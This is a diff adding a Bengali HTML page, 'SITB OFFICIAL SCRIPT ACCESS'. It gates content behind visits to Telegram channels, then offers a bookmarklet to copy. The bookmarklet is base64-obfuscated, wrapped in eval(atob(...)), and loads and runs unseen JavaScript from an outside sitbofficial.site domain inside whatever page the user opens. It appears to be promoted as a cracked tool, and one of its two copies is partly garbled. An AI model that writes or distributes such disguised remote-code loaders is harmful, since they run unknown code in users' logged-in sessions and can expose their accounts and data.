@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SITB OFFICIAL - SCRIPT ACCESS</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        :root {
+            --bg-main: #05050e;
+            --card-bg: rgba(13, 14, 33, 0.75);
+            --neon-purple: #9d4edd;
+            --neon-pink: #ff007f;
+            --neon-cyan: #00f0ff;
+            --neon-green: #00ff87;
+            --text-color: #f0f4f8;
+            --text-muted: #94a3b8;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Rajdhani', sans-serif; }
+
+        body {
+            background-color: var(--bg-main);
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(157, 78, 221, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(255, 0, 127, 0.15) 0%, transparent 40%);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        .grid-bg {
+            position: fixed; inset: 0;
+            background-size: 40px 40px;
+            background-image: 
+                linear-gradient(to right, rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+            z-index: -1;
+        }
+
+        /* Navbar */
+        nav {
+            padding: 0.8rem 6%;
+            display: flex; justify-content: space-between; align-items: center;
+            background: rgba(5, 5, 14, 0.8);
+            backdrop-filter: blur(15px);
+            border-bottom: 1px solid rgba(157, 78, 221, 0.2);
+            position: sticky; top: 0; z-index: 100;
+        }
+
+        .brand-box { display: flex; align-items: center; gap: 12px; }
+        .brand-logo {
+            width: 45px; height: 45px; border-radius: 50%; object-fit: cover;
+            border: 2px solid rgba(0, 240, 255, 0.4);
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.3);
+        }
+        .brand-title {
+            font-family: 'Orbitron', sans-serif; font-size: 1.2rem; font-weight: 900;
+            letter-spacing: 1.5px;
+            background: linear-gradient(90deg, #fff, var(--neon-cyan));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+
+        /* Overlay & Gate Modal */
+        #introScreen {
+            position: fixed; inset: 0; background: rgba(5, 5, 14, 0.95);
+            backdrop-filter: blur(20px); z-index: 999;
+            display: flex; align-items: center; justify-content: center; padding: 1.5rem;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+        #introScreen.hidden-gate { opacity: 0; visibility: hidden; pointer-events: none; }
+
+        .gate-card {
+            background: var(--card-bg);
+            border: 1px solid rgba(0, 240, 255, 0.3);
+            border-radius: 24px; padding: 2.5rem 2rem; width: 100%; max-width: 440px;
+            box-shadow: 0 0 40px rgba(0, 240, 255, 0.15), inset 0 0 15px rgba(157, 78, 221, 0.1);
+            text-align: center; position: relative; overflow: hidden;
+        }
+
+        .gate-card::before {
+            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 4px;
+            background: linear-gradient(90deg, var(--neon-pink), var(--neon-cyan), var(--neon-purple));
+        }
+
+        .gate-logo {
+            width: 65px; height: 65px; border-radius: 50%; object-fit: cover;
+            border: 2px solid var(--neon-cyan);
+            box-shadow: 0 0 20px rgba(0, 240, 255, 0.4);
+            margin: 0 auto 1rem auto; display: block;
+        }
+
+        .gate-title {
+            font-family: 'Orbitron', sans-serif; font-size: 1.2rem; font-weight: 700;
+            color: #fff; margin-bottom: 0.4rem; text-transform: uppercase;
+        }
+        .gate-subtitle { font-size: 0.9rem; color: var(--text-muted); margin-bottom: 1.8rem; }
+        .gate-subtitle span { color: var(--neon-cyan); font-weight: 700; }
+
+        .channel-list { display: flex; flex-direction: column; gap: 12px; margin-bottom: 1.5rem; }
+        .channel-item {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 0.9rem 1.2rem; border-radius: 14px;
+            color: var(--text-color); font-weight: 600; font-size: 0.95rem;
+            text-decoration: none; display: flex; align-items: center; justify-content: space-between;
+            transition: all 0.3s ease;
+        }
+        .channel-item:hover {
+            border-color: var(--neon-cyan);
+            background: rgba(0, 240, 255, 0.08);
+            transform: translateY(-2px);
+        }
+        .channel-item.visited {
+            border-color: var(--neon-green);
+            background: rgba(0, 255, 135, 0.08);
+        }
+        .channel-item .status-icon { color: var(--text-muted); transition: color 0.3s; }
+        .channel-item.visited .status-icon { color: var(--neon-green); }
+
+        .unlock-btn {
+            width: 100%; padding: 1rem; border-radius: 14px; border: none;
+            background: rgba(255, 255, 255, 0.1); color: var(--text-muted);
+            font-family: 'Orbitron', sans-serif; font-weight: 700; font-size: 0.9rem;
+            cursor: not-allowed; transition: all 0.4s ease;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+        }
+        .unlock-btn.unlocked {
+            background: linear-gradient(90deg, var(--neon-purple), var(--neon-pink));
+            color: #fff; cursor: pointer;
+            box-shadow: 0 0 25px rgba(255, 0, 127, 0.5);
+        }
+        .unlock-btn.unlocked:hover { transform: scale(1.02); }
+
+        /* Main Content Dashboard */
+        main {
+            flex: 1; display: flex; align-items: center; justify-content: center;
+            padding: 3rem 1.5rem; position: relative; z-index: 10;
+        }
+
+        .main-card {
+            background: var(--card-bg);
+            border: 1px solid rgba(157, 78, 221, 0.3);
+            border-radius: 28px; width: 100%; max-width: 500px;
+            padding: 2.5rem 2rem; backdrop-filter: blur(20px);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
+            text-align: center;
+        }
+
+        .main-title {
+            font-family: 'Orbitron', sans-serif; font-size: 1.3rem; font-weight: 900;
+            background: linear-gradient(90deg, #fff, var(--neon-purple), var(--neon-cyan));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            margin-bottom: 1.2rem; text-transform: uppercase;
+        }
+
+        /* Code Box */
+        .code-container {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(0, 240, 255, 0.2);
+            border-radius: 16px; padding: 1rem; margin-bottom: 1.5rem; text-align: left;
+        }
+        .code-header {
+            display: flex; justify-content: space-between; align-items: center;
+            font-size: 0.75rem; color: var(--neon-cyan);
+            font-family: 'Orbitron', sans-serif; font-weight: 700;
+            margin-bottom: 0.6rem; text-transform: uppercase;
+        }
+        .code-body {
+            max-height: 120px; overflow-y: auto;
+            background: rgba(5, 5, 14, 0.9);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 8px; padding: 0.8rem;
+            color: var(--text-muted); font-family: monospace; font-size: 0.75rem;
+            word-break: break-all; white-space: pre-wrap; line-height: 1.4;
+        }
+
+        /* Action Buttons */
+        .btn-group { display: flex; flex-direction: column; gap: 12px; }
+
+        .action-btn {
+            padding: 0.95rem; border-radius: 14px; border: none;
+            font-family: 'Orbitron', sans-serif; font-weight: 700; font-size: 0.85rem;
+            cursor: pointer; transition: all 0.3s ease;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            text-transform: uppercase; letter-spacing: 1px;
+        }
+
+        .btn-copy {
+            background: linear-gradient(90deg, var(--neon-cyan), #00b8ff);
+            color: #05050e; box-shadow: 0 0 20px rgba(0, 240, 255, 0.3);
+        }
+        .btn-copy:hover { transform: translateY(-2px); box-shadow: 0 0 30px rgba(0, 240, 255, 0.5); }
+
+        .btn-theme {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            color: var(--text-color); margin-top: 0.5rem;
+        }
+        .btn-theme:hover { background: rgba(255, 255, 255, 0.1); border-color: var(--neon-green); }
+
+        footer {
+            text-align: center; padding: 1.5rem;
+            color: var(--text-muted); font-size: 0.8rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="grid-bg"></div>
+
+    <!-- Intro Gate Overlay (Verification Step) -->
+    <div id="introScreen">
+        <div class="gate-card">
+            <img src="https://i.postimg.cc/76mrK7B5/IMG-20260825-215652-178.jpg" alt="Logo" class="gate-logo">
+            <h2 class="gate-title">SITB OFFICIAL</h2>
+            <p class="gate-subtitle">আনলক করতে সবগুলো চ্যানেল ভিজিট করুন (<span id="visitedCount">0</span>/3)</p>
+
+            <div class="channel-list">
+                <a href="https://t.me/sitbofficial" target="_blank" rel="noopener noreferrer" class="channel-item" onclick="markVisited(0, this)">
+                    <span><i class="fa-brands fa-telegram"></i> SITB OFFICIAL</span>
+                    <i class="fa-solid fa-circle-check status-icon"></i>
+                </a>
+                <a href="https://t.me/stbpublic" target="_blank" rel="noopener noreferrer" class="channel-item" onclick="markVisited(1, this)">
+                    <span><i class="fa-brands fa-telegram"></i> STB PUBLIC CHANNEL</span>
+                    <i class="fa-solid fa-circle-check status-icon"></i>
+                </a>
+                <a href="https://t.me/sitbbotfree" target="_blank" rel="noopener noreferrer" class="channel-item" onclick="markVisited(2, this)">
+                    <span><i class="fa-brands fa-telegram"></i> SITB FREE BOT</span>
+                    <i class="fa-solid fa-circle-check status-icon"></i>
+                </a>
+            </div>
+
+            <button id="unlockBtn" class="unlock-btn" onclick="unlockDashboard()" disabled>
+                <i class="fa-solid fa-lock"></i> <span>প্রথমে ৩টি চ্যানেল ভিজিট করুন</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- Top Navigation -->
+    <nav>
+        <div class="brand-box">
+            <img src="https://i.postimg.cc/76mrK7B5/IMG-20260825-215652-178.jpg" alt="Logo" class="brand-logo">
+            <span class="brand-title">SITB OFFICIAL</span>
+        </div>
+    </nav>
+
+    <!-- Main Dashboard Section -->
+    <main>
+        <div class="main-card">
+            <h1 class="main-title">SITB OFFICIAL SCRIPT ACCESS</h1>
+
+            <!-- Code Display Area -->
+            <div class="code-container">
+                <div class="code-header">
+                    <span><i class="fa-solid fa-code"></i> Script Code</span>
+                </div>
+                <div class="code-body" id="scriptText">javascript:(function(){eval(atob('amF2YXNjcmlwdDooZnVuY3Rpb24oKXtjb25zdCByPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjcmFja2VkYnlzaXRiLWJvb2ktbWFyay\x27KTtpZihyKXtyLnN0eWxlLmRpc3BsYXk9KHIuc3R5bGUuZGlzcGxheT09PSdub25l\x27ID8gJ2Jsb2Nr\x27IDogJ25vbmUnKTtyZXR1cm47fWNvbnN0IHU9J2h0dHBzOi8vc25pcGVyYWljcmFja2VkYnlzaXRpLnNpdGJvZmZpY2lhbC5zaXRlL3NjcmlwdC5qcz90PScrRGF0ZS5ub3coKTtjb25zdCBzPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3Muc3JjPXU7cy5vbmVycm9yPWZ1bmN0aW9uKCl7ZmV0Y2godSkudGhlbihmdW5jdGlvbihyZXMpe3JldHVybiByZXMudGV4dCgpO30pLnRoZW4oZnVuY3Rpb24oY29kZSl7KG5ldyBGdW5jdGlvbihjb2RlKSkoKTs5KS5jYXRjaChmdW5jdGlvbigpe2FsZXJ0KCdTSVRCIE9mZmljaWFsOiBDb25uZWN0aW9uIGZhaWxlZC4gQ2hlY2sgaW50ZXJuZXQuJyk7fSk7fTsoZG9jdW1lbnQuaGVhZCB8fCBkb2N1bWVudC5kb2N1bWVudElubmVyRWxlbWVudikucHNoKCk7fSkoKTs='));})();javascript:(function(){eval(atob('amF2YXNjcmlwdDooZnVuY3Rpb24oKXtjb25zdCByPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjcmFja2VkYnlzaXRiLWJvb2ttYXJrJyk7aWYocil7ci5zdHlsZS5kaXNwbGF5PShyLnN0eWxlLmRpc3BsYXk9PT0nbm9uZScgPyAnYmxvY2snIDogJ25vbmUnKTtyZXR1cm47fWNvbnN0IHU9J2h0dHBzOi8vc25pcGVyYWljcmFja2VkYnlzaXRpLnNpdGJvZmZpY2lhbC5zaXRlL3NjcmlwdC5qcz90PScrRGF0ZS5ub3coKTtjb25zdCBzPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3Muc3JjPXU7cy5vbmVycm9yPWZ1bmN0aW9uKCl7ZmV0Y2godSkudGhlbihmdW5jdGlvbihyZXMpe3JldHVybiByZXMudGV4dCgpO30pLnRoZW4oZnVuY3Rpb24oY29kZSl7KG5ldyBGdW5jdGlvbihjb2RlKSkoKTt9KS5jYXRjaChmdW5jdGlvbigpe2FsZXJ0KCdTSVRCIE9mZmljaWFsOiBDb25uZWN0aW9uIGZhaWxlZC4gQ2hlY2sgaW50ZXJuZXQuJyk7fSk7fTsoZG9jdW1lbnQuaGVhZCB8fCBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQpLmFwcGVuZENoaWxkKHMpO30pKCk7'));})();</div>
+            </div>
+
+            <!-- Action Buttons (Download removed) -->
+            <div class="btn-group">
+                <button id="copyBtn" class="action-btn btn-copy">
+                    <i class="fa-regular fa-copy"></i> Copy Script Code
+                </button>
+                <button id="themeToggle" class="action-btn btn-theme">
+                    <i class="fa-solid fa-palette"></i> Toggle Green Mode
+                </button>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <p>© 2026 SITB OFFICIAL. All Rights Reserved.</p>
+    </footer>
+
+    <script>
+        let visitedStatus = [false, false, false];
+
+        function markVisited(index, element) {
+            if (!visitedStatus[index]) {
+                visitedStatus[index] = true;
+                element.classList.add('visited');
+            }
+
+            let count = visitedStatus.filter(Boolean).length;
+            document.getElementById('visitedCount').textContent = count;
+
+            if (count === 3) {
+                const btn = document.getElementById('unlockBtn');
+                btn.disabled = false;
+                btn.classList.add('unlocked');
+                btn.innerHTML = `<i class="fa-solid fa-unlock"></i> <span>ক্লিক করে আনলক করুন</span>`;
+            }
+        }
+
+        function unlockDashboard() {
+            let count = visitedStatus.filter(Boolean).length;
+            if (count === 3) {
+                document.getElementById('introScreen').classList.add('hidden-gate');
+            } else {
+                alert('দয়া করে ৩টি চ্যানেলই ভিজিট করুন!');
+            }
+        }
+
+        // Copy Code Functionality
+        document.getElementById('copyBtn').addEventListener('click', () => {
+            const code = document.getElementById('scriptText').innerText;
+            navigator.clipboard.writeText(code)
+                .then(() => alert('Script copied successfully!'))
+                .catch(() => alert('Failed to copy!'));
+        });
+
+        // Theme Toggle Effect
+        document.getElementById('themeToggle').addEventListener('click', () => {
+            document.documentElement.style.setProperty('--neon-purple', '#00ff87');
+            document.documentElement.style.setProperty('--neon-pink', '#00f0ff');
+            alert('Cyber Green Theme Activated!');
+        });
+    </script>
+</body>
+  </html>
